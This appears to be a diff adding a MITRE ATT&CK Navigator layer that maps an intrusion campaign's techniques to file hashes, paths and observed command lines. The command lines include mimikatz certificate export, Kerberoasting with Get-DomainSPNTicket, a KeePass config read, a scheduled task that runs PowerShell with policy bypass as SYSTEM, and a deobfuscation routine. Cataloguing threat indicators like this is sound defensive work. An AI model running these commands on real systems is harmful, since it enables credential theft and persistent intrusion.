+                    "value": "function format([string]$source){$tt = \"\";$bb = [System.Convert]::FromBase64String($source);foreach($c in $bb){$tt = $tt + [char]($c -bxor 37 + 1);}return $tt;}"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1069.001",
+            "tactic": "discovery",
+            "score": 3,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "CheckAdmin.exe"
+                },
+                {
+                    "name": "path",
+                    "value": "C:\\Windows\\Temp\\CheckAdmin.exe"
+                },
+                {
+                    "name": "sha256",
+                    "value": "75ac4478c1729d1b5434724cf0c2bd53cc5940d251a4ca07b17c239c8f62da8d"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "CheckAdmin.exe"
+                },
+                {
+                    "name": "path",
+                    "value": "C:\\Windows\\Temp\\CheckAdmin.exe"
+                },
+                {
+                    "name": "sha256",
+                    "value": "5d01150ade4b302b9fd765fd0fb70aa17ee9cb9fcb219c2d270fd90ad8d01188"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\net.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "net localgroup administrators"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1057",
+            "tactic": "discovery",
+            "score": 2,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\tasklist.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "tasklist /v |find /I \"keepass\""
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "tasklist /v |find \"explorer.exe\""
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "tasklist /svc|find \"aia.exe\""
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\tasklist.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "tasklist /v|find \"cb.exe\""
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1055",
+            "tactic": "defense-evasion",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "processlauncher.exe"
+                },
+                {
+                    "name": "path",
+                    "value": "C:\\Windows\\Temp\\processlauncher.exe"
+                },
+                {
+                    "name": "sha256",
+                    "value": "3016ea94e3c5bd7f9d8e503b1817491bcf9e2ee5bb82fc106aa5d692dd0ff5c6"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1055",
+            "tactic": "privilege-escalation",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "processlauncher.exe"
+                },
+                {
+                    "name": "path",
+                    "value": "C:\\Windows\\Temp\\processlauncher.exe"
+                },
+                {
+                    "name": "sha256",
+                    "value": "3016ea94e3c5bd7f9d8e503b1817491bcf9e2ee5bb82fc106aa5d692dd0ff5c6"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1090",
+            "tactic": "command-and-control",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "test.ps1"
+                },
+                {
+                    "name": "path",
+                    "value": "C:\\Windows\\Temp\\test.ps1"
+                },
+                {
+                    "name": "vHash",
+                    "value": "7596fdd04dba990373ab2f3da0c7dd3f"
+                },
+                {
+                    "name": "sha256",
+                    "value": "6972ba198ed0d30de9f66be5777ecdba2d657078f138325ee6db225c20b29e6e"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "unknown c# Agent variant"
+                },
+                {
+                    "name": "sha256",
+                    "value": "5cf61c0b865fd2ab897c72ff2cc01ac4c31ea9c50ecc3d47693f3482fd8f91d4"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "unknown Python Agent variant"
+                },
+                {
+                    "name": "sha256",
+                    "value": "b2162d4cbeee907d1af13918900e6e4f13232d00915563d841aa7c904d94589c"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1090.003",
+            "tactic": "command-and-control",
+            "score": 2,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "test.ps1"
+                },
+                {
+                    "name": "path",
+                    "value": "C:\\Windows\\Temp\\test.ps1"
+                },
+                {
+                    "name": "vHash",
+                    "value": "7596fdd04dba990373ab2f3da0c7dd3f"
+                },
+                {
+                    "name": "sha256",
+                    "value": "6972ba198ed0d30de9f66be5777ecdba2d657078f138325ee6db225c20b29e6e"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "unknown c# Agent variant"
+                },
+                {
+                    "name": "sha256",
+                    "value": "5cf61c0b865fd2ab897c72ff2cc01ac4c31ea9c50ecc3d47693f3482fd8f91d4"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "unknown Python Agent variant"
+                },
+                {
+                    "name": "sha256",
+                    "value": "b2162d4cbeee907d1af13918900e6e4f13232d00915563d841aa7c904d94589c"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1012",
+            "tactic": "discovery",
+            "score": 2,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\reg.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "reg query HKEY_CURRENT_USER\\\\Software\\\\#{username}\\\\PuTTY\\\\Sessions\\\\"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "keyName",
+                    "value": "HKEY_CURRENT_USER\\\\Software\\\\#{username}\\\\PuTTY\\\\Sessions\\\\"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1018",
+            "tactic": "discovery",
+            "score": 4,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "protocol",
+                    "value": "smb"
+                },
+                {
+                    "name": "dstPort",
+                    "value": 445
+                },
+                {
+                    "name": "direction",
+                    "value": "outbound"
+                },
+                {
+                    "name": "dstIp",
+                    "value": "#{internal-network}"
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\Temp\\\\getos.py"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\Temp\\\\nb.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "nb.exe 10.10.0.0/16 >>10.txt"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\ping.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "ping <internal IP address> -n 1"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "protocol",
+                    "value": "icmp"
+                },
+                {
+                    "name": "direction",
+                    "value": "outbound"
+                },
+                {
+                    "name": "dstIp",
+                    "value": "#{internal-ip-address}"
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\ping.exe"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1053.005",
+            "tactic": "execution",
+            "score": 3,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\schtasks.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "schtasks /create /u <DOMAIN>\\<USERNAME> /p \"<PASSWORD>\" /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\\\s.ps1\" /tn win32times /f"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "commands",
+                    "value": "cmd /c powershell.exe -ep bypass -file c:\\s.ps1"
+                },
+                {
+                    "name": "name",
+                    "value": "win32times"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\svchost.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "powershell.exe c:\\\\s.ps1"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1053.005",
+            "tactic": "persistence",
+            "score": 3,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\schtasks.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "schtasks /create /u <DOMAIN>\\<USERNAME> /p \"<PASSWORD>\" /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\\\s.ps1\" /tn win32times /f"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "commands",
+                    "value": "cmd /c powershell.exe -ep bypass -file c:\\s.ps1"
+                },
+                {
+                    "name": "name",
+                    "value": "win32times"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\svchost.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "powershell.exe c:\\\\s.ps1"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1053.005",
+            "tactic": "privilege-escalation",
+            "score": 3,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\schtasks.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "schtasks /create /u <DOMAIN>\\<USERNAME> /p \"<PASSWORD>\" /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\\\s.ps1\" /tn win32times /f"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "commands",
+                    "value": "cmd /c powershell.exe -ep bypass -file c:\\s.ps1"
+                },
+                {
+                    "name": "name",
+                    "value": "win32times"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\svchost.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "powershell.exe c:\\\\s.ps1"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1505.003",
+            "tactic": "persistence",
+            "score": 3,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "jexws4.jsp"
+                },
+                {
+                    "name": "path",
+                    "value": "#{webroot}/jexws4/jexws4.jsp"
+                },
+                {
+                    "name": "extension",
+                    "value": "jsp"
+                },
+                {
+                    "name": "sha256",
+                    "value": "fdc94d0dedf6e53dd435d2b5eacb4c34923fadee50529db6f3de38c71f325e05"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "jexinv4.jsp"
+                },
+                {
+                    "name": "path",
+                    "value": "#{webroot}/jexinv4/jexinv4.jsp"
+                },
+                {
+                    "name": "extension",
+                    "value": "jsp"
+                },
+                {
+                    "name": "sha256",
+                    "value": "a34a7430936ce37e78b995c321ff626933c364c50f1e7689aa1b0660432b4618"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "uknown"
+                },
+                {
+                    "name": "sha256",
+                    "value": "08f87f8c64a4c98b0e99592a436d601249feeaec4a2c4effbf69a166e4f592a0"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "name",
+                    "value": "uknown"
+                },
+                {
+                    "name": "sha256",
+                    "value": "2047e464627e36410b3458e23062f23eecbd383e7854b55b497ec8db017c0d5e"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1558.003",
+            "tactic": "credential-access",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "{Import-Module C:\\\\temp\\\\ik.ps1; Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat}"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1082",
+            "tactic": "discovery",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\Temp\\\\getos.py"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "getos.py #{ip-range} #{save-path}"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1016",
+            "tactic": "discovery",
+            "score": 3,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\Temp\\\\iie.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "dsquery subnet"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\ipconfig.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "ipconfig /all"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\dnscmd.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "dnscmd.exe /ZonePrint #{zone-name}"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1049",
+            "tactic": "discovery",
+            "score": 2,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\netstat.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "netstat -ano|find \"25667\""
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\netstat.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "netstat -ano|find \":3389\""
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "netstat -ano|find \":445\""
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "netstat -ano|find \":3389\""
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1033",
+            "tactic": "discovery",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\Temp\\\\iie.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "C:\\\\Windows\\\\Temp\\\\iie.exe iie.txt -u <domain>\\<username> -p \"<password>\" -session -s iie.log"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1124",
+            "tactic": "discovery",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "time /t"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1552.001",
+            "tactic": "credential-access",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "type C:\\\\users\\\\#{username}\\\\appdata\\\\Roaming\\\\keepass\\\\KeePass.config.xml"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1552.004",
+            "tactic": "credential-access",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\temp\\\\mimikatz"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "echo \"log c:\\\\windows\\\\temp\\\\zaw.txt\" privilege::debug crypto::cng crypto::capi \"crypto::certificates /export\" \"crypto::certificates /systemstore:local_system / store:Root /export\" exit > c:\\\\mrt.ini"
+                },
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\temp\\\\mimikatz"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "echo \"log c:\\\\windows\\\\temp\\\\zaw.txt\" privilege::debug crypto::cng crypto::capi \"crypto::certificates /export\" \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\" exit > c:\\\\mrt.ini"
+                }
+            ],
+            "showSubtechniques": true
+        },
+        {
+            "techniqueID": "T1047",
+            "tactic": "execution",
+            "score": 1,
+            "color": "",
+            "comment": "",
+            "enabled": true,
+            "metadata": [
+                {
+                    "divider": true
+                },
+                {
+                    "name": "process",
+                    "value": "C:\\\\Windows\\\\system32\\\\wbem\\\\WMIC.exe"
+                },
+                {
+                    "name": "parentProcess",
+                    "value": "C:\\\\Windows\\\\System32\\\\cmd.exe"
+                },
+                {
+                    "name": "cmdLine",
+                    "value": "wmic os get lastbootuptime"
+                }
+            ],
+            "showSubtechniques": true
+        }
+    ],
+    "gradient": {
+        "colors": [
+            "#8ec843",
+            "#ffe766",
+            "#ff6666"
+        ],
+        "minValue": 0,
+        "maxValue": 10
+    },
+    "legendItems": [],
+    "metadata": [],
+    "links": [],
+    "showTacticRowBackground": false,
+    "tacticRowBackground": "#dddddd",
+    "selectTechniquesAcrossTactics": true,
+    "selectSubtechniquesWithParent": false
+}
